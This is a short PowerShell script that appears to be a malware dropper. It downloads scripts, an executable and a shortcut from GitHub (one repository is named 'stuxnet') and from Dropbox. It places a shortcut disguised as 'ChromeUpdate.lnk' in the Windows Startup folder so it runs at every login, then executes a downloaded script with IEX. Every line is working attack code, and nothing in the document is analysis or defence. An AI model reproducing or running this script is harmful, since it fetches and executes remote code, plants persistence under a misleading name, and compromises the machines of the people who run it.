$url6 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/Update.ps1"
$output6 = "$env:TEMP\Update.ps1"
Invoke-WebRequest -Uri $url6 -OutFile $output6
$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
Invoke-WebRequest -Uri $url8 -OutFile $output8
$url9 = "https://www.dropbox.com/scl/fi/swqja4ngiwf973dqy8v3v/download.exe?rlkey=p9cwbitz8sycwe3onyil4xmm6&st=0obgnzj5&dl=1"
$output9 = "$env:TEMP\download.exe"
Invoke-WebRequest -Uri $url9 -OutFile $output9
$url5 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/RUNS.ps1"
$output5 = "$env:TEMP\RUNS.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
IEX (Get-Content $output5 | Out-String)
